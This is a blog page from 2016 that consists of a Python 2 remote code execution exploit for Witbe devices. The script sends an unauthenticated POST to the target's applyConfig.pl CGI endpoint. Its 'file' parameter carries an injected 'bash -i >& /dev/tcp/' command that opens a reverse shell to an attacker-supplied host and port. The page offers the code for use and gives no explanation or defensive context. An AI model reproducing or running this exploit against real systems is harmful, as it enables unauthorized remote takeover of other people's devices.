<!DOCTYPE html>
<html lang="en">
<head>
          <title>e11is</title>
        <meta charset="utf-8" />
        <link href="/icon.png" rel="icon">

        <link rel="stylesheet" href="/theme/css/rdark.css" />
	<link rel="stylesheet" type="text/css" href="/theme/css/main.css" />
        <link href="/" type="application/atom+xml" rel="alternate" title="e11is ATOM Feed" /><!--[if IE]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	
<!-- Using MathJax, with the delimiters $ -->
<!-- Conflict with pygments for the .mo and .mi -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
  "HTML-CSS": {
  styles: {
  ".MathJax .mo, .MathJax .mi": {color: "black ! important"}}
  },
  tex2jax: {inlineMath: [['$','$'], ['\\\\(','\\\\)']],processEscapes: true}
  });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
</head>



    <meta name="tags" content="exploit" />
    <meta name="tags" content="rce" />

        <!-- </head>-->

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">e11is <strong></strong></a></h1>
        </header><!-- /#banner -->
        <nav id="menu"><ul>
            <li><a href="/pages/about.html">about</a></li>
            <li><a href="/pages/categories.html">categories</a></li>
            <li><a href="/pages/links.html">links</a></li>
        </ul></nav><!-- /#menu -->
<section id="content" class="body">
  <header>
    <h2 class="entry-title">
      <a href="/witbe-rce-exploit.html" rel="bookmark"
         title="Permalink to witbe rce exploit">witbe rce exploit</a></h2>
 
  </header>
  <footer class="post-info">
    <abbr class="published" title="2016-11-01T00:00:00+01:00">
      Tue 01 November 2016
    </abbr>
    <address class="vcard author">
      By           <a class="url fn" href="/author/e11is.html">e11is</a>
    </address>
  </footer><!-- /.post-info -->
  <div class="entry-content">
    <h3>exploit code (in python)</h3>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python2</span>
<span class="c1"># Exploit Title: Witbe RCE (Remote Code Execution)</span>
<span class="c1"># Exploit Author: BeLmar</span>
<span class="c1"># Date: 05/10/2016</span>
<span class="c1"># DEMO : https://youtu.be/ooUFXfUfIs0</span>
<span class="c1"># Contact : hb.mz093@gmail.com</span>
<span class="c1"># Vendor Homepage: http://www.witbe.net</span>
<span class="c1"># Tested on: Windows7/10 &amp; BackBox</span>
<span class="c1"># Category: Remote Exploits</span>

<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">urllib2</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s1">&#39;witbe.py&#39;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s1">&#39;pwn witbe&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote Target Server&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-l&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;LHOST&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;specifiy local ip for reverse shell&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;LPORT&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;specifiy local port for reverse shell&#39;</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">rhost</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">RHOST</span>
    <span class="n">lhost</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">LHOST</span>
    <span class="n">lport</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">LPORT</span>

    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span><span class="o">+</span><span class="n">rhost</span><span class="o">+</span><span class="s1">&#39;/cgi-bin/applyConfig.pl&#39;</span>
    <span class="n">user_agent</span> <span class="o">=</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36&#39;</span>
    <span class="n">values</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;auth_login&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="c1">#Leave it as it is</span>
              <span class="s1">&#39;auth_pwd&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>   <span class="c1">#Leave it as it is</span>
              <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="s1">&#39;set|bash -i &gt;&amp; /dev/tcp/&#39;</span><span class="o">+</span><span class="n">lhost</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">lport</span><span class="o">+</span><span class="s1">&#39; 0&gt;&amp;1&#39;</span> <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
        <span class="n">the_page</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">e</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">main</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[*] Exiting...&quot;</span><span class="p">)</span>
</pre></div>
  </div><!-- /.entry-content -->
</section>
        <footer id="contentinfo" class="body">
            <ul>
                <p><li>Â© content licensed under a <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution-NonCommercial 4.0 International License</a>, except where indicated otherwise.</li></p>
                <p><li><a href="#">back to top</a></li></p>
            </ul>
        </footer><!-- /#contentinfo -->
</body>
</html>